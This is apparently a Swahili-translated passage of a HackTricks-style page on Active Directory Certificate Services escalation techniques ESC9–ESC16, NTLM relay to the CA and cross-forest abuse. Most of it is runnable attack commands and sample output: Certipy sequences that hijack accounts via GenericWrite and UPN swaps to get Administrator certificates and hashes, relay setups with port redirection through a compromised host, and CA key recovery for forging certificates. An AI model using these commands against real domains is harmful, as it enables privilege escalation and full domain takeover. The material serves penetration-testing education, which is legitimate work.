<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Kutumia Certify vibaya
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Matumizi mabaya na [Certipy](https://github.com/ly4k/Certipy)

Ombi la cheti linafanywa na Certipy kwa chaguo-msingi kulingana na template `Machine` au `User`, ambalo linaamuliwa na ikiwa jina la akaunti linalohamishwa linaisha kwa `$`. Uainishaji wa template mbadala unaweza kufanywa kwa kutumia parameter `-template`.

Mbinu kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kisha kutumika kulazimisha uthibitishaji. Unaposhughulika na wadhibiti wa domain, uainishaji wa `-template DomainController` unahitajika.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Hakuna Kiongezi cha Usalama - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani mpya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) kwa **`msPKI-Enrollment-Flag`**, inayoitwaje ESC9, inazuia kuingizwa kwa **ongezo jipya la usalama `szOID_NTDS_CA_SECURITY_EXT`** kwenye cheti. Bendera hii inakuwa muhimu wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `1` (usanidi wa chaguo-msingi), tofauti na usanidi wa `2`. Umuhimu wake unaongezeka katika matukio ambapo ramani dhaifu ya cheti kwa Kerberos au Schannel inaweza kutumiwa vibaya (kama ilivyo kwa ESC10), kwani kukosekana kwa ESC9 hakutabadilisha mahitaji.

Masharti yanayofanya usanidi wa bendera hii kuwa muhimu ni pamoja na:

- `StrongCertificateBindingEnforcement` haijorekebishwa kuwa `2` (ikiwa chaguo-msingi ni `1`), au `CertificateMappingMethods` inaongeza bendera ya `UPN`.
- Cheti kimewekwa alama na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya usanidi wa `msPKI-Enrollment-Flag`.
- EKU yoyote ya uthibitisho wa mteja imeteuliwa kwenye cheti.
- Ruhusa za `GenericWrite` zinapatikana juu ya akaunti yoyote ili kuharibu nyingine.

### Mfano wa Matumizi Mabaya

Tuseme `John@corp.local` ana ruhusa za `GenericWrite` juu ya `Jane@corp.local`, akiwa na lengo la kumdhibiti `Administrator@corp.local`. Kiolezo cha cheti cha `ESC9`, ambacho `Jane@corp.local` ameruhusiwa kujiandikisha nacho, kimewekwa na bendera ya `CT_FLAG_NO_SECURITY_EXTENSION` katika usanidi wake wa `msPKI-Enrollment-Flag`.

Mwanzo, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kwa sababu ya `GenericWrite` ya `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Baadaye, `userPrincipalName` ya `Jane` imebadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya kikoa `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Marekebisho haya hayivunji vikwazo, kwa kuwa `Administrator@corp.local` bado ni tofauti kama `userPrincipalName` ya Administrator.

Baada ya hayo, kiolezo cha cheti `ESC9`, kilichotajwa kama dhaifu, kimeombwa kama `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Imebainika kuwa `userPrincipalName` ya cheti inaonyesha `Administrator`, bila kuwa na “object SID” yoyote.

`userPrincipalName` ya `Jane` kisha inarudishwa kwa asili yake, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kujaribu uthibitisho kwa kutumia cheti kilichotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima ijumlishe `-domain <domain>` kutokana na cheti kukosa uainishaji wa domain:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Ramani Dhaifu za Vyeti - ESC10

### Maelezo

Thamani mbili za registry kwenye domain controller zinatajwa na ESC10:

- Thamani ya chaguo-msingi ya `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ni `0x18` (`0x8 | 0x10`), hapo awali ilipangwa kuwa `0x1F`.
- Mipangilio ya chaguo-msingi ya `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ni `1`, hapo awali `0`.

### Kesi 1

Wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `0`.

### Kesi 2

Ikiwa `CertificateMappingMethods` inajumuisha bit ya `UPN` (`0x4`).

### Mfano wa Unyonyaji 1

Wakati `StrongCertificateBindingEnforcement` imewekwa kuwa `0`, akaunti A yenye ruhusa za `GenericWrite` inaweza kutumiwa kuweka hatarini akaunti yoyote B.

Kwa mfano, kwa kuwa na ruhusa za `GenericWrite` juu ya `Jane@corp.local`, mdukuaji analenga kuharibu `Administrator@corp.local`. Taratibu zinafanana na ESC9, zikiruhusu kutumia template yoyote ya certificate.

Hapo mwanzoni, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, ikitumia ruhusa za `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Baadaye, `userPrincipalName` ya `Jane` imebadilishwa kuwa `Administrator`, kwa makusudi kuondoa sehemu ya `@corp.local` ili kuepuka uvunjaji wa vigezo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Baada ya hili, cheti kinachowezesha uthibitishaji wa mteja kinaombwa kwa jina la `Jane`, kwa kutumia kiolezo cha chaguo-msingi `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Kisha `userPrincipalName` ya `Jane` inarudishwa kwenye hali yake ya awali, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Kuthibitisha kwa cheti kilichopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo kunahitajika kubainisha domain kwenye amri kutokana na ukosefu wa taarifa za domain kwenye cheti.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kesi ya Matumizi Mabaya 2

Kwa kuwa `CertificateMappingMethods` ina `UPN` bit flag (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza compromise akaunti yoyote B isiyokuwa na mali ya `userPrincipalName`, ikiwemo machine accounts na built-in domain administrator `Administrator`.

Hapa, lengo ni compromise `DC$@corp.local`, kuanzia kwa kupata hash ya `Jane` kupitia Shadow Credentials, kwa kutumia `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` ya `Jane` kisha imewekwa kuwa `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Cheti cha uthibitishaji wa mteja kimeombwa kama `Jane` kwa kutumia kiolezo chaguo-msingi cha `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` ya `Jane` inarudishwa kwenye thamani yake ya asili baada ya mchakato huu.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Ili kuthibitisha kupitia Schannel, chaguo `-ldap-shell` la Certipy linatumiwa, likionyesha mafanikio ya uthibitishaji kama `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kupitia LDAP shell, amri kama `set_rbcd` zinaweza kuwezesha Resource-Based Constrained Delegation (RBCD) attacks, na zinaweza kuhatarisha domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Udhaifu huu pia unahusisha akaunti yoyote ya mtumiaji isiyo na `userPrincipalName` au ambapo haifananishi na `sAMAccountName`. Akaunti ya chaguo-msingi `Administrator@corp.local` ni lengo kuu kutokana na vibali vyake vilivyoongezeka vya LDAP na ukosefu wa `userPrincipalName` kwa chaguo-msingi.

## Relaying NTLM to ICPR - ESC11

### Explanation

Ikiwa CA Server haijasanidiwa na `IF_ENFORCEENCRYPTICERTREQUEST`, inaweza kuruhusu NTLM relay attacks bila kusaini kupitia RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Unaweza kutumia `certipy` kugundua ikiwa `Enforce Encryption for Requests` imezimwa na certipy itaonyesha udhaifu wa `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Senario ya Matumizi Mabaya

Inahitaji kusanidi relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Kumbuka: Kwa domain controllers, lazima taja `-template` katika DomainController.

Au tumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Wasimamizi wanaweza kusanidi Certificate Authority ili kuihifadhi kwenye kifaa cha nje kama "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye server ya CA kupitia bandari ya USB, au kupitia USB device server pale server ya CA ikiwa virtual machine, ufunguo wa uthibitishaji (sometimes referred to as a "password") unahitajika kwa Key Storage Provider ili kuzalisha na kutumia keys ndani ya YubiHSM.

Ufunguo/password huu umehifadhiwa kwenye registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` kwa cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Ikiwa private key ya CA imehifadhiwa kwenye kifaa cha kimwili cha USB na wewe umepata shell access, inawezekana kutrecover key hiyo.

Kwanza, unahitaji kupata certificate ya CA (hii ni public) na kisha:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Hatimaye, tumia amri certutil `-sign` kutengeneza cheti kipya chochote kwa kutumia cheti cha CA na funguo lake binafsi.

## OID Group Link Abuse - ESC13

### Maelezo

Sifa ya `msPKI-Certificate-Policy` inaruhusu sera ya utoaji kuongezwa kwenye template ya cheti. Vitu vya `msPKI-Enterprise-Oid` vinavyowajibika kwa utoaji wa sera vinaweza kugunduliwa katika Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) ya PKI OID container. Sera inaweza kuunganishwa na AD group kwa kutumia sifa ya kitu hiki `msDS-OIDToGroupLink`, ikiruhusu mfumo kuidhinisha mtumiaji anayeonyesha cheti kana kwamba alikuwa mwanachama wa group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Kwa maneno mengine, mtumiaji akiokuwa na ruhusa ya ku-enroll cheti na cheti hicho kikiwa kimeunganishwa na OID group, mtumiaji anaweza kurithi haki za group hiyo.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kugundua OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Tafuta ruhusa ya mtumiaji; unaweza kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Iwapo `John` ana ruhusa ya kujiandikisha kwa `VulnerableTemplate`, mtumiaji anaweza kurithi ruhusa za kikundi `VulnerableGroup`.

Yote anachohitaji kufanya ni kutaja kiolezo, atapata cheti chenye haki za OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Usanidi dhaifu wa Urejeshaji wa Vyeti - ESC14

### Maelezo

Maelezo katika https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ni ya kina sana. Hapa chini ni nukuu ya maandishi ya asili.

ESC14 inashughulikia nyufa zinazotokana na "weak explicit certificate mapping", hasa kupitia matumizi mabaya au usanidi usio salama wa sifa ya `altSecurityIdentities` kwenye akaunti za mtumiaji au kompyuta za Active Directory. Sifa hii yenye thamani nyingi inaruhusu wasimamizi kuhusisha kwa mkono vyeti vya X.509 na akaunti ya AD kwa madhumuni ya uthibitishaji. Inapojaa, ulinganifu huu wazi unaweza kubadilisha mantiki ya kimsingi ya ulinganifu wa vyeti, ambayo kawaida hutegemea UPNs au majina ya DNS katika SAN ya cheti, au SID iliyojengwa ndani ya ugani wa usalama `szOID_NTDS_CA_SECURITY_EXT`.

Ulinganifu "dhaifu" hutokea pale thamani ya string inayotumika ndani ya sifa `altSecurityIdentities` kutambua cheti ni ya upana sana, rahisi kukisia, inaanzia kwenye nyanja za cheti zisizo za kipekee, au inatumia vipengele vya cheti ambavyo ni rahisi kuiga. Ikiwa mshambuliaji anaweza kupata au kutengeneza cheti ambacho sifa zake zinaendana na ulinganifu uliofafanuliwa vibaya kwa akaunti yenye ruhusa, wanaweza kutumia cheti hicho kuthibitisha na kuigiza akaunti hiyo.

Mifano ya nyuzi za ulinganifu za `altSecurityIdentities` zinazoweza kuwa dhaifu ni pamoja na:

- Kulinganisha kwa kutumia tu Subject Common Name (CN) ya kawaida: mfano, `X509:<S>CN=SomeUser`. Mshambuliaji anaweza kupata cheti chenye CN hii kutoka kwa chanzo kisicho salama.
- Kutumia Issuer Distinguished Names (DNs) au Subject DNs ambazo ni za jumla sana bila sifa za ziada kama nambari maalum ya serial au subject key identifier: mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia mifumo mingine inayoweza kutabirika au vitambulisho visivyo vya kriptografia ambavyo mshambuliaji anaweza kutosheleza katika cheti anachoweza kupata kwa halali au kutengeneza (ikiwa wamevamia CA au wamegundua template dhaifu kama ilivyo katika ESC1).

Sifa ya `altSecurityIdentities` inaunga mkono miundo mbalimbali ya ulinganifu, kama:

- `X509:<I>IssuerDN<S>SubjectDN` (inalinganisha kwa Issuer na Subject DN kamili)
- `X509:<SKI>SubjectKeyIdentifier` (inalinganisha kwa thamani ya ugani wa Subject Key Identifier wa cheti)
- `X509:<SR>SerialNumberBackedByIssuerDN` (inalinganisha kwa nambari ya serial, kwa mtazamo inafafanuliwa kwa Implicit na Issuer DN) - hii si muundo wa kawaida, kawaida ni `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (inalinganisha kwa jina la RFC822, kawaida anwani ya barua pepe, kutoka SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (inalinganisha kwa hash ya SHA1 ya public key ghafi ya cheti - kwa ujumla imara)

Usalama wa ulinganifu huu unategemea kwa kiasi kikubwa utofauti, kipekee, na nguvu za kriptografia za vitambulisho vya cheti vilivyotumika katika string ya ulinganifu. Hata kwa kuweka modes imara za certificate binding kwenye Domain Controllers (ambazo kwa msingi zinaathiri ulinganifu wa implicit unaotegemea SAN UPNs/DNS na ugani wa SID), kipengele cha `altSecurityIdentities` kilichosanifiwa vibaya bado kinaweza kutoa njia ya moja kwa moja ya kuigiza akaunti ikiwa mantiki ya ulinganifu yenyewe imeharibika au ni yenye kupitisha sana.

### Hali ya Matumizi Mabaya

ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa sifa ya `altSecurityIdentities`. Ikiwa sifa hii imewekwa (kwa kusudi au kwa usanidi mbaya), washambuliaji wanaweza kuigiza akaunti kwa kuwasilisha vyeti vinavyolingana na ulinganifu.

#### Scenario A: Mshambuliaji Anaweza Kuandika kwenye `altSecurityIdentities`

**Masharti ya awali**: Mshambuliaji ana ruhusa za kuandika kwenye sifa ya `altSecurityIdentities` ya akaunti lengwa au ruhusa ya kuipa katika moja ya ruhusa zifuatazo kwenye kituo cha AD lengwa:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Lengo Lina Ulinganifu Dhaifu kupitia X509RFC822 (Barua pepe)

- **Masharti ya awali**: Lengo lina ulinganifu dhaifu wa X509RFC822 katika altSecurityIdentities. Mshambuliaji anaweza kuweka sifa ya mail ya mwathirika ili ifanane na jina la X509RFC822 la lengo, kusajili/kuomba cheti kama mwathirika, na kukitumia kuthibitisha kama lengo.

#### Scenario C: Lengo Lina Ulinganifu X509IssuerSubject

- **Masharti ya awali**: Lengo lina ulinganifu wazi dhaifu wa X509IssuerSubject katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa za `cn` au `dNSHostName` kwenye principal ya mwathirika ili zifananane na subject ya ulinganifu wa X509IssuerSubject wa lengo. Kisha, mshambuliaji anaweza kusajili cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.

#### Scenario D: Lengo Lina Ulinganifu X509SubjectOnly

- **Masharti ya awali**: Lengo lina ulinganifu wazi dhaifu wa X509SubjectOnly katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka sifa za `cn` au `dNSHostName` kwenye principal ya mwathirika ili zifananane na subject ya ulinganifu wa X509SubjectOnly wa lengo. Kisha, mshambuliaji anaweza kusajili cheti kama mwathirika, na kutumia cheti hicho kuthibitisha kama lengo.

### Operesheni halisi

#### Scenario A

Omba cheti kwa kutumia template ya cheti `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Hifadhi na ubadilishe cheti
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Thibitisha (kwa kutumia cheti)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Usafishaji (hiari)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Kwa njia za mashambulizi maalum katika matukio mbalimbali ya mashambulizi, tafadhali rejea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Maelezo

Maelezo kwenye https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ni ya kina sana. Hapa chini ni nukuu ya maandishi ya asili.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Matumizi mabaya

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.


Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senario A: Kuiga Moja kwa Moja kupitia Schannel

**Hatua 1: Omba cheti, ukiingiza "Client Authentication" Application Policy na UPN ya lengo.** Mshambuliaji `attacker@corp.local` analenga `administrator@corp.local` akitumia template ya "WebServer" V1 (ambayo inaruhusu enrollee-supplied subject).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Template dhaifu ya V1 yenye "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inaingiza OID `1.3.6.1.5.5.7.3.2` katika extension ya Application Policies ya CSR.
- `-upn 'administrator@corp.local'`: Inaweka UPN katika SAN kwa ajili ya kuiga.

**Hatua ya 2: Thibitisha kupitia Schannel (LDAPS) ukitumia cheti kilichopatikana.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Hatua 1: Omba cheti kutoka kwa template ya V1 (with "Enrollee supplies subject"), ukiongeza "Certificate Request Agent" Application Policy.** Cheti hiki ni kwa ajili ya attacker (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN imeainishwa kwa utambulisho wa mshambuliaji hapa, kwani lengo ni uwezo wa enrollment agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Inaingiza OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua 2: Tumia cheti cha "agent" kuomba cheti kwa niaba ya mtumiaji lengwa mwenye ruhusa za juu.** Hii ni hatua inayofanana na ESC3, ikitumia cheti kutoka Hatua ya 1 kama cheti cha "agent".
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Hatua ya 3: Thibitisha kama mtumiaji mwenye ruhusa kwa kutumia cheti cha "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Kiendelezaji cha Usalama Kimezimwa kwenye CA (Globally)-ESC16

### Maelezo

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejea hali ambapo, ikiwa usanidi wa AD CS hautoi kulazimisha kuingizwa kwa kiendelezaji **szOID_NTDS_CA_SECURITY_EXT** katika vyeti vyote, mshambuliaji anaweza kutumia hili kwa:

1. Kuomba cheti **bila SID binding**.

2. Kutumia cheti hiki **kwa uthibitisho kama akaunti yoyote**, kama kuiga akaunti yenye ruhusa kubwa (mfano, Domain Administrator).

Unaweza pia kurejea makala hii ili kujifunza zaidi kuhusu kanuni za kina:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Matumizi mabaya

Ifuatayo inarejea [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Bonyeza kuona njia za matumizi za kina.

Ili kubaini kama mazingira ya Active Directory Certificate Services (AD CS) yako hatarini kwa **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Hatua 1: Soma UPN ya awali ya akaunti ya mwathirika (Hiari - kwa urejesho).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Hatua 2: Sasisha UPN ya akaunti ya mwathiri kuwa `sAMAccountName` ya msimamizi lengwa.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Hatua 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Hatua 4: Omba cheti kama mtumiaji "victim" kutoka kwa _any suitable client authentication template_ (e.g., "User") kwenye ESC16-vulnerable CA.** Kwa sababu CA ni dhaifu dhidi ya ESC16, itatoa kwa otomatiki SID security extension kutoka kwenye cheti kilichotolewa, bila kujali mipangilio maalum ya template kwa ugani huu. Set the Kerberos credential cache environment variable (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Kisha omba cheti:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Hatua ya 5: Rudisha UPN ya akaunti ya "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Hatua 6: Thibitisha kama msimamizi wa lengo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Kuvuruga Misitu kwa Vyeti Kumeelezwa kwa Sauti Isiyo ya Moja

### Kuvunjwa kwa Trusts za Misitu na CA Zilizoharibiwa

Usanidi wa **cross-forest enrollment** umefanywa kuwa rahisi. **root CA certificate** kutoka resource forest huchapishwa kwa account forests na wasimamizi, na vyeti za **enterprise CA** kutoka resource forest zinaongezwa kwenye `NTAuthCertificates` na AIA containers katika kila account forest. Ili kufafanua, mpangilio huu unamkabidhi **CA katika resource forest udhibiti kamili** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itavamiwa na wadukuzi, vyeti kwa watumiaji wote katika resource na account forests vinaweza kutengenezwa kwa uongo na wao, na hivyo kuvunja mpaka wa usalama wa forest.

### Haki za Enrollment Zilizotolewa kwa Foreign Principals

Katika mazingira ya multi-forest, tahadhari inahitajika kuhusu Enterprise CAs ambazo zinachapisha **certificate templates** ambazo zinawaruhusu **Authenticated Users or foreign principals** (watumiaji/vikundi nje ya forest ambayo Enterprise CA inamilikiwa) haki za **enrollment and edit rights**.\
Baada ya uthibitisho kupitia trust, **Authenticated Users SID** inaongezwa kwenye token ya mtumiaji na AD. Hivyo, ikiwa domain ina Enterprise CA yenye template inayoruhusu **Authenticated Users enrollment rights**, template inaweza kusajiliwa na mtumiaji kutoka forest tofauti. Vivyo hivyo, ikiwa **enrollment rights zimetolewa wazi kwa foreign principal na template**, basi **cross-forest access-control relationship inaundwa**, ikimruhusu principal kutoka forest moja **kuenroll kwenye template ya forest nyingine**.

Matukio yote mawili huongeza **attack surface** kutoka forest moja hadi nyingine. Mipangilio ya certificate template inaweza kutumiwa na mwadui kupata vibali zaidi katika domain ya kigeni.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
